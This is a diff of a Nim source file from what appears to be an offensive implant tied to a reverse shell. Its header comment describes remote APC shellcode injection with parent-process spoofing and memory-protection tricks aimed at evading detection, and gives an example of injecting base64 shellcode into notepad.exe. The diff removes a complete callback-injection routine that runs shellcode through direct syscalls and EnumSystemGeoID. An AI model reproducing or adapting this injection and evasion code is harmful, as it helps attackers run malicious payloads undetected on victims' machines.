@@ -1,16 +1,13 @@
 #[
-  - Remote injection:
-      Suspended -> Alloc(RW) -> Write -> NtQueueApcThread -> Protect(PAGE_NOACECSS) -> DelayExec -> Protect(RX) -> Resume
+  - Remote APC injection:
+      Start/Suspend given binary under PPID of processes name set in the reverse shell
+        -> Alloc(RW) -> Write -> NtQueueApcThread -> Protect(PAGE_NOACECSS) -> DelayExec -> Protect(RX) -> Resume
 
-    - Used as an option in the reverse shell.
-    - Example in shell: 
-        convert.py sc.bin
+    - Example usage:
+        .\converter sc.bin
         [LP_SHELL] > inject C:\\Windows\\notepad.exe ZmM0ODgxZTRmMGZmZm[..snip..]MjJlNjQ2YzZjMDA=
 
-  - Callback injection:
-      Alloc(RW) -> Write -> Protect(PAGE_NOACCESS) -> DelayExec -> Protect(RX) -> EnumGeoID
-
-  References:
+  References/Credit:
     https://github.com/ajpc500/NimExamples/blob/main/src/SysCallsMessageBoxshellCodeQueueUserremApcInject.nim
     https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/
     https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
@@ -22,12 +19,12 @@ import nimvoke/dinvoke
 
 from util import convertSeconds
 from processes import findTargetProc 
-from winim/lean import TRUE, DWORD, DWORD64, DWORD_PTR, SIZE_T, HANDLE, CLIENT_ID, PVOID, LPVOID, WINBOOL, NULL, FALSE, NTSTATUS, LARGE_INTEGER, 
+from winim/lean import TRUE, DWORD, DWORD64, SIZE_T, HANDLE, CLIENT_ID, PVOID, LPVOID, WINBOOL, NULL, NTSTATUS, LARGE_INTEGER, 
                        BOOLEAN, LPCWSTR, LPWSTR, LPSTARTUPINFOW, OBJECT_ATTRIBUTES, STARTUPINFOEX, PROCESS_INFORMATION, SECURITY_ATTRIBUTES, 
                        PROCESS_ALL_ACCESS, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, CREATE_NO_WINDOW, LPSECURITY_ATTRIBUTES, LPPROCESS_INFORMATION,
                        EXTENDED_STARTUPINFO_PRESENT, DETACHED_PROCESS, CREATE_SUSPENDED, MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, 
-                       PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, PAGE_NOACCESS, GEOCLASS, GEOID, GEO_ENUMPROC, LPPROC_THREAD_ATTRIBUTE_LIST, 
-                       StartupInfo, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList, UpdateProcThreadAttribute, `&`, `$`
+                       PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, PAGE_NOACCESS, LPPROC_THREAD_ATTRIBUTE_LIST, 
+                       StartupInfo, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList, UpdateProcThreadAttribute, `&`
 
 type
   KNORMAL_ROUTINE* {.pure.} = object
@@ -37,7 +34,6 @@ type
   PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE
 
 var 
-  ntds: NTSTATUS
   alertable: BOOLEAN = 0
   delayInterval: LARGE_INTEGER
   rxDelay: int64 = 70 # VProtect to RX delay time in seconds
@@ -69,38 +65,6 @@ dinvokeDefine(
   proc (hHeap: HANDLE, dwFlags: DWORD, dwBytes: SIZE_T): LPVOID {.stdcall.})
 
 dinvokeDefine(GetProcessHeap, "kernel32.dll", proc (): HANDLE {.stdcall.})
-
-dinvokeDefine(
-  EnumSystemGeoID, 
-  "kernel32.dll",
-  proc (GeoClass: GEOCLASS, ParentGeoId: GEOID, lpGeoEnumProc: GEO_ENUMPROC): WINBOOL {.stdcall.}
-)
-
-proc callBack*(shellCode: openArray[byte]): void =
-  var
-    status = 0
-    dest: LPVOID
-    hProcess: HANDLE = 0xFFFFFFFFFFFFFFFF
-    scSize: SIZE_T = cast[SIZE_T](shellCode.len)
-
-  status = syscall(NtAllocateVirtualMemory, hProcess, &dest, 0, &scSize, MEM_COMMIT, PAGE_READWRITE)
-  if status != 0: return 
-
-  var bytesWritten: SIZE_T 
-  status = syscall(NtWriteVirtualMemory, hProcess, dest, shellCode, scSize-1, addr bytesWritten)
-  if status != 0: return 
-
-  var oldProtect: DWORD = 0
-  status = syscall(NtProtectVirtualMemory, hProcess, &dest, &scSize, PAGE_NOACCESS, &oldprotect)
-  if status != 0: return
-
-  delayInterval.QuadPart = -convertSeconds(rxDelay)
-  ntds = NtDelayExecution(alertable, addr(delayInterval))
-
-  status = syscall(NtProtectVirtualMemory, hProcess, &dest, &scSize, PAGE_EXECUTE_READ, &oldProtect)
-  if status != 0: return 
-
-  discard EnumSystemGeoID(16, 0, cast[GEO_ENUMPROC](dest))
 
 const
   PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000
